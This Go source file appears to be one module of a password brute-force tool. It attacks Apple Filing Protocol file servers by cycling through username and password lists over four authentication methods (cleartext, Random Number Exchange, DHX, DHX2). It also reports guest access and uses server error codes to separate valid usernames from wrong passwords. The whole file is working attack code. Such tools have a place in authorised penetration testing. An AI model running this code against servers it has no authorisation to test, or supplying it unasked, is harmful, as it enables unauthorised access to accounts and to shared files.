/*
afp.go implements brute-force attack against the Apple Filing Protocol (AFP),
	encapsulated in Data Stream Interface (DSI).

Usage:
	[no option]
	ac := NewAFP(...)
	ac.Run()

	[with option]
	ac := NewAFP(...)
	if ok := ac.LoadOpt(...); ok {
		ac.Run()
	}

Note:
	1. Cleartext Password and Random Number Exchange have not been tested.
	2. The following authentication methods are NOT implemented:
		a. Two-Way Random Number Exchange (2-Way Randnum)
			Its process is like Random Number Exchange, with additional steps to verify the server
			after client authentication. Unwanted.
		b. Kerberos V5 (Client Krb v2)
			Hard to implement.
		c. GSSAPI (GSS)
			Packet format unspeficied.
		d. Reconnect (Recon1)
			It is necessary to acquire a session key (DHX, DHX2, Krb) before requesting Recon1.
			Unavailable for a brute-force attack.

Reference:
	https://developer.apple.com/library/archive/documentation/Networking/Conceptual/AFP/AFPSecurity/AFPSecurity.html
*/

package main

import (
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"encoding/binary"
	"errors"
	"strings"

	"golang.org/x/crypto/cast5"
)

/* an incomplete list of commands */
const (
	/* request */
	DSICommand     byte = 0x02
	DSIGetStatus   byte = 0x03
	DSIOpenSession byte = 0x04

	/* command */
	FPOption      byte = 0x01
	FPGetSrvrInfo byte = 0x0f
	FPLogin       byte = 0x12
	FPLoginCont   byte = 0x13
)

var AFPEndian = binary.BigEndian

type afpConn struct {
	/* connection */
	*conn /* underlying transport layer connection */

	/* Login */
	*list      /* credential list for brute-force attack */
	mode  Mode /* authentication mode */

	/* Server */
	version string /* AFP version, prepended with its length */
	uam     string /* user authentication method, prepended with its length */

	/* Packet */
	message []byte /* store message read */
	reqid   uint16 /* sequential request id */
}

/* create and initialize a new *afpConn object */
func NewAFP(network, ip, port string, timeout int, userlist, passlist []string, tls bool) *afpConn {
	/* default network tcp */
	if network == "" {
		network = "tcp"
	}

	/* default port 548 */
	if port == "" {
		port = "548"
	}

	return &afpConn{conn: NewConn(network, ip, port, timeout, tls), list: NewList(userlist, passlist)}
}

/* load module specific options */
func (ac *afpConn) LoadOpt(options map[string]string) bool {
	if len(options) == 0 {
		return true
	}

	if auth, ok := options["auth"]; ok {
		switch auth {
		case "":
		case "cp":
			ac.uam = "Cleartxt Passwrd"
		case "rnx":
			ac.uam = "Randnum exchange"
		case "dhx":
			ac.uam = "DHCAST128"
		case "dhx2":
			ac.uam = "DHX2"
		default:
			ac.PrintError("invalid option [auth]\n")
			ac.ShowOpt()
			return false
		}
		delete(options, "auth")
	}

	if len(options) > 0 {
		ac.PrintError("invalid module specific options\n")
		ac.ShowOpt()
		return false
	}

	return true
}

/* print module specific option */
func (ac *afpConn) ShowOpt() {
	ac.PrintInfo("Module AFP supports the following option:")
	ac.PrintInfo("[auth] select an AFP user authentication method")
	ac.PrintInfo("       cp   -- Cleartxt Passwrd  (Cleartext Password)")
	ac.PrintInfo("       rnx  -- Randnum exchange  (Random Number Exchange)")
	ac.PrintInfo("       dhx  -- DHCAST128         (Diffie-Hellman Key Exchange)")
	ac.PrintInfo("       dhx2 -- DHX2              (Diffie-Hellman Key Exchange 2)")
}

/* the one-for-all afp brute-force method,
   call directly after an afpConn is initialized */
func (ac *afpConn) Run() {
	recon := true /* reconnection */

	/* try login */
	for recon == true {
		/* initialize transport layer connection */
		err := ac.Dial()
		if err != nil {
			ac.PrintError("failed to connect to the server: %s", err)
			return
		}
		/* continue or not */
		recon = ac.login()

		ac.Close()
	}
}

/************************************************************************
 *                              Try Login                               *
 ************************************************************************/

/* try login */
func (ac *afpConn) login() bool {
	/* check available server versions and user authentication method */
	if ac.mode == UNKNOWN {
		/* we cannot send another request in the same session */
		return ac.getServerInfo()
	}

	/* open a new session */
	ok := ac.openSession()
	if ok == false {
		return ok
	}

	/* pick a user authentication method */
	switch ac.uam {
	case "Cleartxt Passwrd":
		return ac.authCP()
	case "Randnum exchange":
		return ac.authRNX()
	case "DHCAST128":
		return ac.authDHX()
	case "DHX2":
		return ac.authDHX2()
	default:
		return false
	}

}

/* request and check the server info */
func (ac *afpConn) getServerInfo() bool {
	var err error

	/* send server info request */
	err = ac.write(DSIGetStatus, []byte{FPGetSrvrInfo, 0x00})
	if err != nil {
		ac.PrintError("failed to send server info request: %s", err)
		return false
	}

	/* read server info response */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to read server info: %s", err)
		return false
	}
	if errcode != 0 {
		ac.PrintError("read server info errcode %d", errcode)
		return false
	}

	/* read supported version */
	start := AFPEndian.Uint16(ac.message[2:4])
	end := AFPEndian.Uint16(ac.message[4:6])
	str := string(ac.message[start+1 : end])

	/* we only support 3.x */
	if i := strings.Index(str, "AFP3."); i != -1 {
		ac.version = str[i : i+6]
	} else {
		ac.PrintError("unsupported versions: %s", str)
		return false
	}

	/* check user authentication methods */
	start = end
	end = AFPEndian.Uint16(ac.message[6:8])
	if end == 0 { /* some server does not have an icon */
		i := 11 + ac.message[10]
		end = AFPEndian.Uint16(ac.message[i : i+2])
	}
	str = string(ac.message[start+1 : end])

	if ac.uam == "" {
		/* whether server supports guest user */
		if strings.Contains(str, "No User Authent") {
			ac.PrintResult(GUEST)
		}

		/* choose the authentication method */
		if strings.Contains(str, "DHCAST128") {
			ac.uam = "DHCAST128"
		} else if strings.Contains(str, "DHX2") {
			ac.uam = "DHX2"
		} else if strings.Contains(str, "Cleartxt Passwrd") {
			ac.uam = "Cleartxt Passwrd"
		} else if strings.Contains(str, "Randnum exchange") {
			ac.uam = "Randnum exchange"
		} else {
			ac.PrintError("unsupported authentication methods: %s", str)
			return false
		}
	} else {
		if !strings.Contains(str, ac.uam) {
			ac.PrintError("server does not support [auth] %s", ac.uam)
			return false
		}
	}

	ac.mode = CRED
	return true
}

/* open new session */
func (ac *afpConn) openSession() bool {
	/* request OpenSession */
	buf := make([]byte, 6)
	buf[0] = FPOption /* option: attention quantum */
	buf[1] = 0x04     /* length */
	buf[4] = 0x04     /* quantum: 1024 */
	err := ac.write(DSIOpenSession, buf)
	if err != nil {
		ac.PrintError("failed to open session: %s", err)
		return false
	}

	/* reply OpenSession */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to open session: %s", err)
		return false
	}
	if errcode != 0 {
		ac.PrintError("open session error code %d ", errcode)
		return false
	}

	return true
}

/* handle authentication result */
func (ac *afpConn) handleResult() bool {
	/* read authentication response */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to read authentication result: %s", err)
		return false
	}

	/* check error code */
	switch errcode {
	case 0: /* login success */
		ac.PrintResult(CRED)
		ac.mode = USER
		return ac.HasNext(USER)

	case -5019: /* kFPParamErr: authentication failed (incorrect username) */
		ac.mode = USER
		return ac.HasNext(USER)

	case -5023: /* kFPUserNotAuth: incorrect password */
		ac.mode = CRED
		return ac.HasNext(CRED)

	default: /* unknown */
		ac.PrintError("unexpected error code %d in authentication result", errcode)
		return false
	}
}

/************************************************************************
 *                             Authenticate                             *
 ************************************************************************/

/* do Cleartext Password authentication */
func (ac *afpConn) authCP() bool {
	/* grep credential pair */
	user, pass := ac.Next(ac.mode)

	/* build authentication payload */
	buf := make([]byte, len(ac.version)+len(ac.uam)+len(user)+13)
	buf[0] = FPLogin
	i := ac.copyStr(buf[1:], ac.version) + 1
	i += ac.copyStr(buf[i:], ac.uam)
	i += ac.copyStr(buf[i:], user)

	/* a null-byte may be inserted before password so that it starts at even boundary */
	if i%2 == 0 {
		buf = buf[:len(buf)-1]
	} else {
		i++
	}

	/* password is null-padded to at least 8 bytes */
	copy(buf[i:], pass)

	/* send cleartext password auth */
	err := ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send cleartext auth: %s", err)
		return false
	}

	return ac.handleResult()
}

/* do Random Number Exchange authentication */
func (ac *afpConn) authRNX() bool {
	/* grep credential pair */
	user, pass := ac.Next(ac.mode)

	/* build stage 1 authentication payload */
	buf := make([]byte, len(ac.version)+len(ac.uam)+len(user)+4)
	buf[0] = FPLogin
	i := ac.copyStr(buf[1:], ac.version) + 1
	i += ac.copyStr(buf[i:], ac.uam)
	ac.copyStr(buf[i:], user)

	/* send stage 1 authentication request */
	err := ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send Random Number Exchange (stage 1): %s", err)
		return false
	}

	/* read authentication response */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to read Random Number Exchange (stage 1) response: %s", err)
		return false
	}

	/* sheck error code */
	switch errcode {
	case -5001: /* continue login */
	case -5019, -5023: /* login failed */
		ac.mode = USER
		return ac.HasNext(USER)
	default:
		ac.PrintError("unexpected error code %d in Random Number Exchange (stage 1)", errcode)
		return false
	}

	/* make sure the response packet is in right form */
	if len(ac.message) != 10 {
		ac.PrintError("invalid Random Number Exchange packet (stage 1)")
		return false
	}

	/* build stage 2 authentictaion payload */
	buf = make([]byte, 12)
	buf[0] = FPLoginCont
	copy(buf[2:4], ac.message[:2])

	/* des encryption using password as key */
	tmp := make([]byte, 8)
	copy(tmp, pass)
	c, _ := des.NewCipher(tmp)
	c.Encrypt(buf[4:12], ac.message[2:10])

	/* send stage 2 authentication request */
	err = ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send Random Number Exchange (stage 2): %s", err)
		return false
	}

	return ac.handleResult()
}

/* do Diffie-Hellman Key Exchange authentication */
func (ac *afpConn) authDHX() bool {
	/* grep credential pair */
	user, pass := ac.Next(ac.mode)

	/* build stage 1 authentication payload */
	buf := make([]byte, len(ac.version)+len(ac.uam)+len(user)/2*2+21)
	buf[0] = FPLogin
	i := ac.copyStr(buf[1:], ac.version) + 1
	i += ac.copyStr(buf[i:], ac.uam)
	ac.copyStr(buf[i:], user) /* username must be null padded if its pascal length is odd */
	buf[len(buf)-1] = 0x01    /* set client private key to 1 (generator is always 7) */

	/* send stage 1 authentication request */
	err := ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send DHX auth (stage 1): %s", err)
		return false
	}

	/* read authentication response */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to read DHX auth (stage 1) response: %s", err)
		return false
	}

	/* sheck error code */
	switch errcode {
	case -5001: /* continue login */
	case -5019, -5023: /* login failed */
		ac.mode = USER
		return ac.HasNext(USER)
	default:
		ac.PrintError("unexpected error code %d in DHX auth (stage 1)", errcode)
		return false
	}

	/* make sure the response packet is in right form */
	if len(ac.message) != 50 {
		ac.PrintError("invalid DHX packet (stage 1)")
		return false
	}

	/* build stage 2 authentictaion payload */
	buf = make([]byte, 84)
	buf[0] = FPLoginCont
	copy(buf[2:4], ac.message[:2]) /* ID */
	copy(buf[20:], pass)

	/* cast-128-cbc cipher */
	c2siv := []byte{0x4c, 0x57, 0x61, 0x6c, 0x6c, 0x61, 0x63, 0x65} /* server-to-client initialization vector */
	s2civ := []byte{0x43, 0x4a, 0x61, 0x6c, 0x62, 0x65, 0x72, 0x74} /* client-to-server initialization vector */
	sharedkey := make([]byte, 16)
	sharedkey[15] = 1 /* sharedkey == 1 */
	c, _ := cast5.NewCipher(sharedkey)
	cipher.NewCBCDecrypter(c, s2civ).CryptBlocks(buf[4:20], ac.message[18:34])

	/* we need to return server nonce + 1 */
	for i := 19; i > 3; i-- {
		buf[i]++
		if buf[i] != 0 {
			break
		}
	}

	/* encrypt nonce and password */
	cipher.NewCBCEncrypter(c, c2siv).CryptBlocks(buf[4:84], buf[4:84])

	/* send stage 2 authentication request */
	err = ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send DHX auth (stage 2): %s", err)
		return false
	}

	return ac.handleResult()
}

/* do Diffie-Hellman Key Exchange 2 authentication */
func (ac *afpConn) authDHX2() bool {
	/* grep credential pair */
	user, pass := ac.Next(ac.mode)

	/* build stage 1 authentication payload */
	buf := make([]byte, len(ac.version)+len(ac.uam)+len(user)+4)
	buf[0] = FPLogin
	i := ac.copyStr(buf[1:], ac.version) + 1
	i += ac.copyStr(buf[i:], ac.uam)
	ac.copyStr(buf[i:], user)

	/* send stage 1 authentication request */
	err := ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send DHX2 auth (stage 1): %s", err)
		return false
	}

	/* read authentication response */
	errcode, err := ac.read()
	if err != nil {
		ac.PrintError("failed to read DHX2 auth (stage 1) response: %s", err)
		return false
	}

	/* sheck error code */
	switch errcode {
	case -5001: /* continue login */
	case -5019, -5023: /* login failed */
		ac.mode = USER
		return ac.HasNext(USER)
	default:
		ac.PrintError("unexpected error code %d in DHX2 auth (stage 1)", errcode)
		return false
	}

	/* make sure the response packet is in right form */
	if len(ac.message) < 8 {
		ac.PrintError("invalid DHX2 packet (stage 1)")
		return false
	}
	length := int(AFPEndian.Uint16(ac.message[6:8]))
	if len(ac.message) != 2*length+8 {
		ac.PrintError("invalid DHX2 packet (stage 1)")
		return false
	}

	/* build stage 2 authentictaion payload */
	buf = make([]byte, length+20)
	buf[0] = FPLoginCont
	copy(buf[2:4], ac.message[:2]) /* ID */
	buf[length+3] = 0x01           /* clientkey == 1 */
	/* nonce is set to 0 */

	/* client-side cast-128-cbc cipher */
	c2siv := []byte{0x4c, 0x57, 0x61, 0x6c, 0x6c, 0x61, 0x63, 0x65} /* client-to-server initialization vector */
	sharedkey := make([]byte, length)
	sharedkey[length-1] = 0x01 /* sharedkey == 1 */
	castkey := md5.Sum(sharedkey)
	c, _ := cast5.NewCipher(castkey[:])
	cipher.NewCBCEncrypter(c, c2siv).CryptBlocks(buf[length+4:], buf[length+4:]) /* encrypt nonce */

	/* send stage 2 authentication request */
	err = ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send DHX2 auth (stage 2): %s", err)
		return false
	}

	/* read authentication response */
	errcode, err = ac.read()
	if err != nil {
		ac.PrintError("failed to read DHX2 auth (stage 2) response: %s", err)
		return false
	}

	/* sheck error code, we are in public key exchange so only -5001 is expected */
	if errcode != -5001 {
		ac.PrintError("unexpected error code %d in DHX2 auth (stage 2)", errcode)
		return false
	}

	/* make sure the response packet is in right form */
	if len(ac.message) != 34 { /* ID (2 bytes) + CAST(cnonce+1, snonce, s2civ) */
		ac.PrintError("invalid DHX2 packet (stage 2)")
		return false
	}

	/* build stage 3 authentictaion payload */
	buf = make([]byte, 276)
	buf[0] = FPLoginCont
	copy(buf[2:4], ac.message[:2]) /* ID */
	copy(buf[20:], pass)           /* 256-byte password padded with nulls */

	/* server-side cast-128-cbc cipher */
	s2civ := []byte{0x43, 0x4a, 0x61, 0x6c, 0x62, 0x65, 0x72, 0x74}
	tmp := make([]byte, 32) /* retrieve decrypted server nonce */
	cipher.NewCBCDecrypter(c, s2civ).CryptBlocks(tmp, ac.message[2:34])
	copy(buf[4:20], tmp[16:])
	/* note that if we just decrypte the latter 16 bytes we will get a different result,
	because the CBC mode affects the result based on previous decryption. */

	/* we need to return server nonce + 1 */
	for i := 19; i > 3; i-- {
		buf[i]++
		if buf[i] != 0 {
			break
		}
	}

	/* encrypt nonce and password, note that you cannot reuse the previously defined cipher */
	cipher.NewCBCEncrypter(c, c2siv).CryptBlocks(buf[4:], buf[4:])

	/* send stage 3 authentication request */
	err = ac.write(DSICommand, buf)
	if err != nil {
		ac.PrintError("failed to send DHX2 auth (stage 3): %s", err)
		return false
	}

	return ac.handleResult()
}

/************************************************************************
 *                            Helper Methods                            *
 ************************************************************************/

/* copy the string preceded by its length as a byte */
func (ac *afpConn) copyStr(dst []byte, src string) int {
	dst[0] = byte(len(src))
	return copy(dst[1:], src) + 1
}

/************************************************************************
 *                            Handle Packets                            *
 ************************************************************************/

/* read message from the server, an afp error code is returned */
func (ac *afpConn) read() (int32, error) {
	/* read DSI header */
	buf := make([]byte, 16)
	n, err := ac.Read(buf)
	if err != nil {
		return 0, err
	}

	if n < 16 || buf[0] != 1 {
		return 0, errors.New("invalid AFP packet")
	}

	/* save DSI error code */
	errcode := int32(AFPEndian.Uint32(buf[4:8]))

	/* read AFP message */
	length := int(AFPEndian.Uint32(buf[8:12]))
	buf = make([]byte, length)
	n, err = ac.Read(buf)
	if err != nil {
		return 0, err
	}

	if n < length {
		return 0, errors.New("invalid AFP packet")
	}

	ac.message = buf

	return errcode, nil
}

/* send request to the server, a DSI command is required */
func (ac *afpConn) write(dsicmd byte, data []byte) error {
	buf := make([]byte, 16+len(data))
	/* first byte is always 0, indicating we are sending a request */
	buf[1] = dsicmd                         /* DSI command */
	AFPEndian.PutUint16(buf[2:4], ac.reqid) /* sequential request ID*/
	ac.reqid++
	/* data offset is always zero (we will never use DSIWrite) */
	AFPEndian.PutUint32(buf[8:12], uint32(len(data))) /* AFP data length */
	copy(buf[16:], data)                              /* AFP data */

	return ac.Write(buf)
}
